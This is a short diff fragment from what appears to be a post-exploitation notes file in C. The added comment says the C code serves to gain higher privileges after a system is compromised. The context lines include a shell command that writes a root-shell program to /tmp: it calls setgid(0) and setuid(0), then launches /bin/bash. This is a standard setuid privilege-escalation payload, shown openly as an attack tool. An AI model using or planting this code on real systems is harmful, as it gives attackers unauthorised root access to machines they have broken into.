@@ -11,6 +11,8 @@ int main(){
 	return 0;
 }
 
+//When the above C code is infiltrated into the system, if the conditions are met, it is used to Increase Authorization in the POST EXPLOITING phase.
+
 /*
 
 echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/example.c
